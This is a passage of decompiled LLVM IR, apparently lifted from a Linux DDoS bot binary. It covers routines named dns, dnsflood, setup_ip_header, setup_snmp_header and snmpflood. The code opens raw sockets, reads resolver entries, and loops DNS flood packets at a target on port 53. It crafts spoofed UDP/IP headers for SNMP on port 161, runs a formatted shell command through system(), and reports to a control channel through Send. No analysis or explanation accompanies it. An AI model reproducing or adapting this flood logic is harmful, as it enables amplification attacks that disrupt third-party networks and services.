  store i32 %v1_8049f6b, i32* %edx.global-to-local, align 4
  store i32 %v2_8049e9c, i32* @eax, align 4
  %v2_8049f7b = inttoptr i32 %v1_8049f6b to i8*
  %v3_8049f7b = call i32 @strcpy(i8* %v2_8049f7b, i32 %v2_8049e9c)
  %v0_8049f80 = load i32, i32* @global_var_807f300.80, align 256
  %v2_8049f89 = add i32 %v0_8049f80, 528
  %v3_8049f89 = inttoptr i32 %v2_8049f89 to i32*
  store i32 %arg2, i32* %v3_8049f89, align 4
  %v0_8049f8f = load i32, i32* @global_var_807f300.80, align 256
  %v2_8049f9a = add i32 %v0_8049f8f, 532
  %v3_8049f9a = inttoptr i32 %v2_8049f9a to i32*
  store i32 %v0_8049f8f, i32* %v3_8049f9a, align 4
  %v0_8049fa0 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_8049fa0, i32* @edx, align 4
  store i32 %v0_8049fa0, i32* %eax.global-to-local, align 4
  %v2_8049fab = add i32 %v0_8049fa0, 536
  %v3_8049fab = inttoptr i32 %v2_8049fab to i32*
  store i32 %v0_8049fa0, i32* %v3_8049fab, align 4
  br label %dec_label_pc_804a065

dec_label_pc_8049fb6:                             ; preds = %dec_label_pc_8049efb
  store i32 %v1_8049fbd, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v3_8049fde = inttoptr i32 %v1_8049fbd to i8*
  %v4_8049fde = call i32 @__GI_memset(i8* %v3_8049fde, i32 0, i32 540)
  store i32 %v2_8049e67, i32* %eax.global-to-local, align 4
  %v1_8049fe9 = call i32 @inet_addr(i32 %v2_8049e67)
  store i32 %v1_8049fe9, i32* %edx.global-to-local, align 4
  store i32 %v1_8049fbd, i32* %eax.global-to-local, align 4
  %v2_8049ff3 = add i32 %v1_8049fbd, 4
  %v3_8049ff3 = inttoptr i32 %v2_8049ff3 to i32*
  store i32 %v1_8049fe9, i32* %v3_8049ff3, align 4
  %v2_8049ffd = call i32 @htons(i16 53)
  %v1_804a008 = trunc i32 %v2_8049ffd to i16
  %v3_804a008 = add i32 %v1_8049fbd, 2
  %v4_804a008 = inttoptr i32 %v3_804a008 to i16*
  store i16 %v1_804a008, i16* %v4_804a008, align 2
  %v1_804a00f = add i32 %v1_8049fbd, 16
  store i32 %v1_804a00f, i32* %edx.global-to-local, align 4
  store i32 %v2_8049e9c, i32* @eax, align 4
  %v2_804a01f = inttoptr i32 %v1_804a00f to i8*
  %v3_804a01f = call i32 @strcpy(i8* %v2_804a01f, i32 %v2_8049e9c)
  %v0_804a024 = load i32, i32* @global_var_807f300.80, align 256
  %v2_804a02d = add i32 %v1_8049fbd, 536
  %v3_804a02d = inttoptr i32 %v2_804a02d to i32*
  store i32 %v0_804a024, i32* %v3_804a02d, align 4
  %v0_804a033 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804a033, i32* %edx.global-to-local, align 4
  %v2_804a03c = add i32 %v0_804a033, 528
  %v3_804a03c = inttoptr i32 %v2_804a03c to i32*
  store i32 %arg2, i32* %v3_804a03c, align 4
  %v0_804a042 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804a042, i32* %eax.global-to-local, align 4
  %v1_804a047 = add i32 %v0_804a042, 532
  %v2_804a047 = inttoptr i32 %v1_804a047 to i32*
  %v3_804a047 = load i32, i32* %v2_804a047, align 4
  %v2_804a050 = add i32 %v1_8049fbd, 532
  %v3_804a050 = inttoptr i32 %v2_804a050 to i32*
  store i32 %v3_804a047, i32* %v3_804a050, align 4
  %v0_804a056 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804a056, i32* @edx, align 4
  store i32 %v1_8049fbd, i32* %eax.global-to-local, align 4
  %v2_804a05f = add i32 %v0_804a056, 532
  %v3_804a05f = inttoptr i32 %v2_804a05f to i32*
  store i32 %v1_8049fbd, i32* %v3_804a05f, align 4
  br label %dec_label_pc_804a065

dec_label_pc_804a065:                             ; preds = %dec_label_pc_8049f08, %dec_label_pc_8049fb6
  %v2_804a06b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804a06b, i32* @ebx, align 4
  store i32 %v0_8049dab, i32* @edi, align 4
  %v0_804a06e = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804a06e

; uselistorder directives
  uselistorder i32 %v0_8049fa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8049f8f, { 1, 0 }
  uselistorder i32 %v1_8049fbd, { 1, 0, 2, 3, 4, 5, 7, 6, 11, 12, 10, 9, 8, 13 }
  uselistorder i32 %v1_8049ef2, { 1, 0 }
  uselistorder i32 %storemerge, { 2, 0, 1 }
  uselistorder i32 %stack_var_-20.1, { 5, 4, 0, 3, 2, 1 }
  uselistorder i8* %v1_8049e3b, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_8049e38, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v2_8049e67, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8049e9c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8049ed5, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 7, 4, 5, 8, 9 }
  uselistorder i32* %eax.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 13, 8, 9, 10, 11, 12, 7, 14, 27, 28, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 29, 31, 32 }
  uselistorder i32 511, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a065, { 1, 0 }
  uselistorder label %dec_label_pc_8049ed2, { 1, 0 }
  uselistorder label %dec_label_pc_8049ecf, { 3, 0, 1, 2 }
}

define i32 @dns(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-1367 = alloca i32, align 4
  %stack_var_-1111 = alloca i32, align 4
  %stack_var_-1080 = alloca i32, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804a089 = call i32 @mfork(i32 %arg1)
  store i32 %v1_804a089, i32* %eax.global-to-local, align 4
  %v1_804a08e = icmp eq i32 %v1_804a089, 0
  %v1_804a090 = icmp eq i1 %v1_804a08e, false
  br i1 %v1_804a090, label %dec_label_pc_804a45e, label %dec_label_pc_804a096

dec_label_pc_804a096:                             ; preds = %entry
  %v5_804a0ad = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v5_804a0ad, i32* %eax.global-to-local, align 4
  %v5_804a0b5 = icmp slt i32 %v5_804a0ad, 0
  %v1_804a0b9 = icmp eq i1 %v5_804a0b5, false
  br i1 %v1_804a0b9, label %dec_label_pc_804a0c7, label %dec_label_pc_804a0bb

dec_label_pc_804a0bb:                             ; preds = %dec_label_pc_804a096
  %v1_804a0c2 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804a0c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a0c7

dec_label_pc_804a0c7:                             ; preds = %dec_label_pc_804a096, %dec_label_pc_804a0bb
  %v4_804a0c7 = add i32 %arg2, -4
  %v9_804a0c7 = sub i32 3, %arg2
  %v10_804a0c7 = and i32 %v9_804a0c7, %arg2
  %v11_804a0c7 = icmp slt i32 %v10_804a0c7, 0
  %v12_804a0c7 = icmp eq i32 %v4_804a0c7, 0
  %v13_804a0c7 = icmp slt i32 %v4_804a0c7, 0
  %v3_804a0cb = icmp eq i1 %v13_804a0c7, %v11_804a0c7
  %v4_804a0cb = icmp eq i1 %v12_804a0c7, false
  %v5_804a0cb = and i1 %v4_804a0cb, %v3_804a0cb
  br i1 %v5_804a0cb, label %dec_label_pc_804a0f6, label %dec_label_pc_804a0cd

dec_label_pc_804a0cd:                             ; preds = %dec_label_pc_804a0c7
  %v0_804a0cd = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_804a0cd, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804a0e5 = call i32 @Send(i32 %v0_804a0cd, i32 ptrtoint ([67 x i8]* @global_var_8069b94.81 to i32))
  store i32 %v3_804a0e5, i32* %eax.global-to-local, align 4
  %v1_804a0f1 = call i32 @__GI_exit(i32 -1)
  store i32 %v1_804a0f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a0f6

dec_label_pc_804a0f6:                             ; preds = %dec_label_pc_804a0c7, %dec_label_pc_804a0cd
  %v1_804a0f9 = add i32 %arg3, 12
  store i32 %v1_804a0f9, i32* %eax.global-to-local, align 4
  %v1_804a0fc = inttoptr i32 %v1_804a0f9 to i32*
  %v2_804a0fc = load i32, i32* %v1_804a0fc, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804a109 = and i32 %v2_804a0fc, -256
  store i32 %v1_804a109, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804a10c = inttoptr i32 %v2_804a0fc to i8*
  %v3_804a112 = call i32 @_strlen(i8* %v4_804a10c)
  %v4_804a112 = mul i32 %v3_804a112, -1
  %v5_804a112 = add i32 %v4_804a112, -2
  store i32 %v5_804a112, i32* %ecx.global-to-local, align 4
  %v1_804a118 = sub i32 0, %v4_804a112
  store i32 %v1_804a118, i32* %edx.global-to-local, align 4
  %v2_804a120 = mul i32 %v3_804a112, 5
  %v1_804a122 = add i32 %v2_804a120, 160
  store i32 %v1_804a122, i32* %eax.global-to-local, align 4
  %v4_804a12a = add i32 %v2_804a120, -863
  %v9_804a12a = sub i32 862, %v2_804a120
  %v10_804a12a = and i32 %v9_804a12a, %v1_804a122
  %v11_804a12a = icmp slt i32 %v10_804a12a, 0
  %v12_804a12a = icmp eq i32 %v4_804a12a, 0
  %v13_804a12a = icmp slt i32 %v4_804a12a, 0
  %v3_804a131 = icmp eq i1 %v13_804a12a, %v11_804a12a
  %v4_804a131 = icmp eq i1 %v12_804a12a, false
  %v5_804a131 = and i1 %v4_804a131, %v3_804a131
  br i1 %v5_804a131, label %dec_label_pc_804a45e, label %dec_label_pc_804a137

dec_label_pc_804a137:                             ; preds = %dec_label_pc_804a0f6
  store i32 %v1_804a0f9, i32* %eax.global-to-local, align 4
  %v2_804a13d = load i32, i32* %v1_804a0fc, align 4
  store i32 %v2_804a13d, i32* %edx.global-to-local, align 4
  store i32 %v1_804a0f9, i32* %eax.global-to-local, align 4
  %v2_804a145 = load i32, i32* %v1_804a0fc, align 4
  store i32 %v2_804a145, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a0f9, i32* %eax.global-to-local, align 4
  %v2_804a14d = load i32, i32* %v1_804a0fc, align 4
  store i32 %v2_804a14d, i32* @ebx, align 4
  store i32 %v1_804a0f9, i32* %eax.global-to-local, align 4
  %v2_804a155 = load i32, i32* %v1_804a0fc, align 4
  store i32 %v2_804a155, i32* @esi, align 4
  store i32 %v1_804a0f9, i32* %eax.global-to-local, align 4
  %v2_804a15d = load i32, i32* %v1_804a0fc, align 4
  store i32 %v1_804a122, i32* @edi, align 4
  %v2_804a182 = ptrtoint i32* %stack_var_-1080 to i32
  store i32 %v2_804a182, i32* %eax.global-to-local, align 4
  %v9_804a18b = call i32 @__GI_snprintf(i32 %v2_804a182, i32 %v1_804a122, i32 ptrtoint ([171 x i8]* @global_var_8069bd8.82 to i32), i32 %v2_804a15d, i32 %v2_804a155, i32 %v2_804a14d, i32 %v2_804a145)
  store i32 %v2_804a182, i32* %eax.global-to-local, align 4
  %v1_804a199 = call i32 @system(i32 %v2_804a182)
  store i32 %v1_804a199, i32* %eax.global-to-local, align 4
  store i32 0, i32* @global_var_807f300.80, align 256
  %v1_804a1af = call i32 @malloc(i32 256)
  store i32 %v1_804a1af, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v5_804a1d0 = inttoptr i32 %v1_804a1af to i8*
  %v6_804a1d0 = call i32 @__GI_memset(i8* %v5_804a1d0, i32 0, i32 256)
  %v2_804a1e5 = ptrtoint i32* %stack_var_-1111 to i32
  %tmp42 = bitcast i32* %stack_var_-1111 to i8*
  store i32 %v2_804a1e5, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 31, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a1f3 = call i8* @_memset(i8* %tmp42, i32 0, i32 31)
  %v6_804a1f3 = ptrtoint i8* %v5_804a1f3 to i32
  store i32 %v6_804a1f3, i32* %ecx.global-to-local, align 4
  %v2_804a202 = ptrtoint i32* %stack_var_-1367 to i32
  store i32 %v2_804a202, i32* %edx.global-to-local, align 4
  store i32 255, i32* %eax.global-to-local, align 4
  %v5_804a21c = bitcast i32* %stack_var_-1367 to i8*
  %v6_804a21c = call i32 @__GI_memset(i8* %v5_804a21c, i32 0, i32 255)
  store i32 %v6_804a21c, i32* @eax, align 4
  %v3_804a237 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_8069c85.84 to i32), i32 ptrtoint ([2 x i8]* @global_var_8069c83.83 to i32))
  %v3_804a24e = inttoptr i32 %v6_804a1d0 to i8*
  store i32 %v6_804a1d0, i32* %eax.global-to-local, align 4
  %v5_804a26b51 = call i32 @fgets(i32 %v6_804a1d0, i32 256, i32 %v3_804a237)
  store i32 %v5_804a26b51, i32* %eax.global-to-local, align 4
  %v1_804a27052 = icmp eq i32 %v5_804a26b51, 0
  %v1_804a27254 = icmp eq i1 %v1_804a27052, false
  br i1 %v1_804a27254, label %dec_label_pc_804a241, label %dec_label_pc_804a274

dec_label_pc_804a241:                             ; preds = %dec_label_pc_804a137, %dec_label_pc_804a241
  %stack_var_-40.055 = phi i32 [ %v4_804a253, %dec_label_pc_804a241 ], [ 0, %dec_label_pc_804a137 ]
  store i32 %v6_804a1d0, i32* %eax.global-to-local, align 4
  %v4_804a24e = call i32 @ParseResolverLine(i8* %v3_804a24e, i32 %stack_var_-40.055)
  %v4_804a253 = add i32 %stack_var_-40.055, 1
  store i32 %v6_804a1d0, i32* %eax.global-to-local, align 4
  %v5_804a26b = call i32 @fgets(i32 %v6_804a1d0, i32 256, i32 %v3_804a237)
  store i32 %v5_804a26b, i32* %eax.global-to-local, align 4
  %v1_804a270 = icmp eq i32 %v5_804a26b, 0
  %v1_804a272 = icmp eq i1 %v1_804a270, false
  br i1 %v1_804a272, label %dec_label_pc_804a241, label %dec_label_pc_804a274

dec_label_pc_804a274:                             ; preds = %dec_label_pc_804a241, %dec_label_pc_804a137
  %v1_804a27e = add i32 %arg3, 16
  store i32 %v1_804a27e, i32* %eax.global-to-local, align 4
  %v1_804a281 = inttoptr i32 %v1_804a27e to i32*
  %v2_804a281 = load i32, i32* %v1_804a281, align 4
  store i32 %v2_804a281, i32* %eax.global-to-local, align 4
  %v1_804a286 = call i32 @atol(i32 %v2_804a281)
  %v0_804a28e = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804a28e, i32* %eax.global-to-local, align 4
  %v1_804a293 = add i32 %v0_804a28e, 532
  %v2_804a293 = inttoptr i32 %v1_804a293 to i32*
  %v3_804a293 = load i32, i32* %v2_804a293, align 4
  store i32 %v3_804a293, i32* %eax.global-to-local, align 4
  %v2_804a2ac = call i32 @htons(i16 0)
  %v1_804a2be = add i32 %arg3, 4
  store i32 %v1_804a2be, i32* %eax.global-to-local, align 4
  %v1_804a2c1 = inttoptr i32 %v1_804a2be to i32*
  %v2_804a2c1 = load i32, i32* %v1_804a2c1, align 4
  store i32 %v2_804a2c1, i32* %eax.global-to-local, align 4
  %v1_804a2c6 = call i32 @inet_addr(i32 %v2_804a2c1)
  %v1_804a2d4 = mul i32 %v1_804a286, 4
  store i32 %v1_804a2d4, i32* %edx.global-to-local, align 4
  %v2_804a2e2 = mul i32 %v1_804a286, 28
  %v1_804a2e7 = add i32 %v2_804a2e2, 30
  %v2_804a2ea = and i32 %v1_804a2e7, -16
  %v0_804a2f0 = load i32, i32* @esp, align 4
  %v2_804a2f0 = sub i32 %v0_804a2f0, %v2_804a2ea
  %v1_804a302 = add i32 %v2_804a2f0, 47
  %v2_804a305 = and i32 %v1_804a302, -16
  store i32 %v2_804a305, i32* @edi, align 4
  %v1_804a31d = add i32 %arg3, 8
  store i32 %v1_804a31d, i32* %eax.global-to-local, align 4
  %v1_804a320 = inttoptr i32 %v1_804a31d to i32*
  %v2_804a320 = load i32, i32* %v1_804a320, align 4
  store i32 %v2_804a320, i32* %eax.global-to-local, align 4
  %v2_804a322 = inttoptr i32 %v2_804a2f0 to i32*
  store i32 %v2_804a320, i32* %v2_804a322, align 4
  %v1_804a325 = call i32 @atol(i32 %v2_804a305)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a3f949 = icmp sgt i32 %v1_804a286, 0
  br i1 %v5_804a3f949, label %dec_label_pc_804a339.lr.ph, label %dec_label_pc_804a3ff

dec_label_pc_804a339.lr.ph:                       ; preds = %dec_label_pc_804a274
  %v3_804a36d = or i32 %v2_804a305, 8
  br label %dec_label_pc_804a339

dec_label_pc_804a339:                             ; preds = %dec_label_pc_804a339, %dec_label_pc_804a339.lr.ph
  %storemerge50 = phi i32 [ 0, %dec_label_pc_804a339.lr.ph ], [ %v4_804a3f0, %dec_label_pc_804a339 ]
  %v1_804a33f = mul i32 %storemerge50, 4
  %v2_804a34d = mul i32 %storemerge50, 28
  %v3_804a352 = add i32 %v2_804a34d, %v2_804a305
  %v4_804a352 = inttoptr i32 %v3_804a352 to i32*
  store i32 %storemerge50, i32* %v4_804a352, align 4
  store i32 %v2_804a305, i32* %ecx.global-to-local, align 4
  store i32 %v2_804a34d, i32* %edx.global-to-local, align 4
  %v4_804a36d = add i32 %v3_804a36d, %v2_804a34d
  %v5_804a36d = inttoptr i32 %v4_804a36d to i32*
  store i32 2, i32* %v5_804a36d, align 4
  %v1_804a377 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a377 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a377 = add i32 %v1_804a377, 12
  %v4_804a377 = add i32 %v3_804a377, %v2_804a377
  %v5_804a377 = inttoptr i32 %v4_804a377 to i32*
  store i32 %v1_804a2c6, i32* %v5_804a377, align 4
  %v1_804a381 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a381 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a381 = add i32 %v1_804a381, 16
  %v4_804a381 = add i32 %v3_804a381, %v2_804a381
  %v5_804a381 = inttoptr i32 %v4_804a381 to i32*
  %v1_804a38b = load i32, i32* %edx.global-to-local, align 4
  %v2_804a38b = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a38b = add i32 %v1_804a38b, 20
  %v4_804a38b = add i32 %v3_804a38b, %v2_804a38b
  %v5_804a38b = inttoptr i32 %v4_804a38b to i32*
  %v1_804a3a7 = add i32 %v3_804a352, 4
  %v2_804a3ad = inttoptr i32 %v1_804a3a7 to i32*
  store i32 %v3_804a293, i32* %v2_804a3ad, align 4
  %v1_804a3c7 = add i32 %v3_804a352, 24
  %v2_804a3cd = inttoptr i32 %v1_804a3c7 to i32*
  store i32 %v1_804a325, i32* %v2_804a3cd, align 4
  store i32 %v2_804a305, i32* @ecx, align 4
  store i32 %v1_804a33f, i32* %edx.global-to-local, align 4
  store i32 %v3_804a352, i32* %eax.global-to-local, align 4
  %v1_804a3e8 = load i32, i32* @esp, align 4
  %v2_804a3e8 = inttoptr i32 %v1_804a3e8 to i32*
  store i32 %v3_804a352, i32* %v2_804a3e8, align 4
  %v0_804a3eb = call i32 @dnsflood()
  %v4_804a3f0 = add nuw nsw i32 %storemerge50, 1
  store i32 %v4_804a3f0, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804a3f0, %v1_804a286
  br i1 %exitcond, label %dec_label_pc_804a3ff, label %dec_label_pc_804a339

dec_label_pc_804a3ff:                             ; preds = %dec_label_pc_804a339, %dec_label_pc_804a274
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804a274 ], [ %v1_804a286, %dec_label_pc_804a339 ]
  store i32 %v1_804a31d, i32* %eax.global-to-local, align 4
  %v2_804a405 = load i32, i32* %v1_804a320, align 4
  store i32 %v2_804a405, i32* %edx.global-to-local, align 4
  store i32 %v1_804a2be, i32* %eax.global-to-local, align 4
  %v2_804a40d = load i32, i32* %v1_804a2c1, align 4
  store i32 %v2_804a40d, i32* %eax.global-to-local, align 4
  %v0_804a40f = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_804a40f, i32* %ecx.global-to-local, align 4
  %v1_804a415 = load i32, i32* @esp, align 4
  %v2_804a415 = add i32 %v1_804a415, 16
  %v3_804a415 = inttoptr i32 %v2_804a415 to i32*
  store i32 %v2_804a405, i32* %v3_804a415, align 4
  %v0_804a419 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a419 = load i32, i32* @esp, align 4
  %v2_804a419 = add i32 %v1_804a419, 12
  %v3_804a419 = inttoptr i32 %v2_804a419 to i32*
  store i32 %v0_804a419, i32* %v3_804a419, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804a420 = load i32, i32* @esp, align 4
  %v2_804a420 = add i32 %v1_804a420, 8
  %v3_804a420 = inttoptr i32 %v2_804a420 to i32*
  store i32 %arg1, i32* %v3_804a420, align 4
  %v0_804a424 = load i32, i32* @esp, align 4
  %v1_804a424 = add i32 %v0_804a424, 4
  %v2_804a424 = inttoptr i32 %v1_804a424 to i32*
  store i32 ptrtoint ([36 x i8]* @global_var_8069c90.85 to i32), i32* %v2_804a424, align 4
  %v0_804a42c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a42c = load i32, i32* @esp, align 4
  %v2_804a42c = inttoptr i32 %v1_804a42c to i32*
  store i32 %v0_804a42c, i32* %v2_804a42c, align 4
  %v2_804a42f = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_804a286)
  store i32 %v2_804a42f, i32* %eax.global-to-local, align 4
  %v7_804a438 = icmp sgt i32 %arg2, 4
  br i1 %v7_804a438, label %dec_label_pc_804a43a, label %dec_label_pc_804a452

dec_label_pc_804a43a:                             ; preds = %dec_label_pc_804a3ff
  %v1_804a43d = add i32 %arg3, 20
  store i32 %v1_804a43d, i32* %eax.global-to-local, align 4
  %v1_804a440 = inttoptr i32 %v1_804a43d to i32*
  %v2_804a440 = load i32, i32* %v1_804a440, align 4
  store i32 %v2_804a440, i32* %eax.global-to-local, align 4
  %v1_804a442 = load i32, i32* @esp, align 4
  %v2_804a442 = inttoptr i32 %v1_804a442 to i32*
  store i32 %v2_804a440, i32* %v2_804a442, align 4
  %v1_804a445 = call i32 @atol(i32 %storemerge.lcssa)
  store i32 %v1_804a445, i32* %eax.global-to-local, align 4
  %v1_804a44a = load i32, i32* @esp, align 4
  %v2_804a44a = inttoptr i32 %v1_804a44a to i32*
  store i32 %v1_804a445, i32* %v2_804a44a, align 4
  %v1_804a44d = call i32 @sleep(i32 %storemerge.lcssa)
  store i32 %v1_804a44d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a452

dec_label_pc_804a452:                             ; preds = %dec_label_pc_804a3ff, %dec_label_pc_804a43a
  %v0_804a452 = load i32, i32* @esp, align 4
  %v1_804a452 = inttoptr i32 %v0_804a452 to i32*
  store i32 1, i32* %v1_804a452, align 4
  %v1_804a459 = call i32 @__GI_exit(i32 %storemerge.lcssa)
  store i32 %v1_804a459, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a45e

dec_label_pc_804a45e:                             ; preds = %dec_label_pc_804a0f6, %entry, %dec_label_pc_804a452
  %v0_804a46b = phi i32 [ %v1_804a122, %dec_label_pc_804a0f6 ], [ %v1_804a089, %entry ], [ %v1_804a459, %dec_label_pc_804a452 ]
  ret i32 %v0_804a46b

; uselistorder directives
  uselistorder i32 %storemerge.lcssa, { 3, 2, 1, 0 }
  uselistorder i32 %v3_804a352, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_804a34d, { 0, 2, 1 }
  uselistorder i32 %storemerge50, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804a305, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v1_804a286, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %stack_var_-40.055, { 1, 0 }
  uselistorder i32 %v3_804a237, { 1, 0 }
  uselistorder i32 %v6_804a1d0, { 5, 4, 2, 0, 1, 3 }
  uselistorder i32 %v4_804a12a, { 1, 0 }
  uselistorder i32 %v4_804a0c7, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 7, 5, 6, 12, 8, 9, 10, 11, 13, 15, 14, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 2, 1, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 47, 46 }
  uselistorder i32 %arg3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804a45e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a452, { 1, 0 }
  uselistorder label %dec_label_pc_804a241, { 1, 0 }
  uselistorder label %dec_label_pc_804a0f6, { 1, 0 }
  uselistorder label %dec_label_pc_804a0c7, { 1, 0 }
}

define i32 @setup_snmp_header(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a46c = load i32, i32* @ebp, align 4
  store i32 %v0_804a46c, i32* %stack_var_-4, align 4
  %v2_804a479 = call i32 @htons(i16 4500)
  %v4_804a481 = ptrtoint i16* %arg1 to i32
  %v1_804a484 = trunc i32 %v2_804a479 to i16
  store i16 %v1_804a484, i16* %arg1, align 2
  %v2_804a48e = call i32 @htons(i16 161)
  %v1_804a499 = trunc i32 %v2_804a48e to i16
  %v3_804a499 = add i32 %v4_804a481, 2
  %v4_804a499 = inttoptr i32 %v3_804a499 to i16*
  store i16 %v1_804a499, i16* %v4_804a499, align 2
  %v1_804a4a0 = add i32 %v4_804a481, 6
  %v2_804a4a0 = inttoptr i32 %v1_804a4a0 to i16*
  store i16 0, i16* %v2_804a4a0, align 2
  %v1_804a4a9 = add i32 %v4_804a481, 8
  %v3_804a4c3 = inttoptr i32 %v1_804a4a9 to i16*
  %v4_804a4c3 = call i32 @memcpy(i16* %v3_804a4c3, i32 ptrtoint (i32* @global_var_8069cb4.86 to i32), i32 67)
  %v2_804a4cf = call i32 @htons(i16 75)
  %v1_804a4da = trunc i32 %v2_804a4cf to i16
  %v4_804a4da = add i32 %v4_804a481, 4
  %v5_804a4da = inttoptr i32 %v4_804a4da to i16*
  store i16 %v1_804a4da, i16* %v5_804a4da, align 2
  %v2_804a4de = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a4de, i32* @ebp, align 4
  ret i32 %v4_804a481

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @setup_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a4e0 = load i32, i32* @ebp, align 4
  store i32 %v0_804a4e0, i32* %stack_var_-4, align 4
  %v4_804a4e6 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804a501 = add i32 %v4_804a4e6, 1
  %v2_804a501 = inttoptr i32 %v1_804a501 to i8*
  store i8 0, i8* %v2_804a501, align 1
  %v1_804a508 = add i32 %v4_804a4e6, 2
  %v2_804a508 = inttoptr i32 %v1_804a508 to i16*
  store i16 42, i16* %v2_804a508, align 2
  %v2_804a515 = call i32 @htonl(i32 64074)
  %v1_804a51a = urem i32 %v2_804a515, 65536
  store i32 %v1_804a51a, i32* @edx, align 4
  %v1_804a520 = trunc i32 %v2_804a515 to i16
  %v3_804a520 = add i32 %v4_804a4e6, 4
  %v4_804a520 = inttoptr i32 %v3_804a520 to i16*
  store i16 %v1_804a520, i16* %v4_804a520, align 2
  %v1_804a527 = add i32 %v4_804a4e6, 6
  %v2_804a527 = inttoptr i32 %v1_804a527 to i16*
  store i16 0, i16* %v2_804a527, align 2
  %v1_804a530 = add i32 %v4_804a4e6, 8
  %v2_804a530 = inttoptr i32 %v1_804a530 to i8*
  store i8 -1, i8* %v2_804a530, align 1
  %v1_804a537 = add i32 %v4_804a4e6, 9
  %v2_804a537 = inttoptr i32 %v1_804a537 to i8*
  store i8 17, i8* %v2_804a537, align 1
  %v1_804a53e = add i32 %v4_804a4e6, 10
  %v2_804a53e = inttoptr i32 %v1_804a53e to i16*
  store i16 0, i16* %v2_804a53e, align 2
  %v2_804a54b = call i32 @inet_addr(i32 ptrtoint ([13 x i8]* @global_var_8069cf8.87 to i32))
  %v3_804a555 = add i32 %v4_804a4e6, 12
  %v4_804a555 = inttoptr i32 %v3_804a555 to i32*
  store i32 %v2_804a54b, i32* %v4_804a555, align 4
  %v2_804a558 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a558, i32* @ebp, align 4
  ret i32 %v4_804a4e6

; uselistorder directives
  uselistorder i32 %v2_804a515, { 1, 0 }
}

define i32 @snmpflood() local_unnamed_addr {
entry:
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4148 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  %v2_804a56a = ptrtoint i32* %stack_var_-4128 to i32
  %v1_804a576 = add i32 %v2_804a56a, 20
  %v5_804a579 = inttoptr i32 %v1_804a576 to i16*
  %v1_804a588 = add i32 %tmp20, 12
  %v2_804a588 = inttoptr i32 %v1_804a588 to i32*
  %v3_804a588 = load i32, i32* %v2_804a588, align 4
  %v1_804a5a6 = add i32 %tmp20, 4
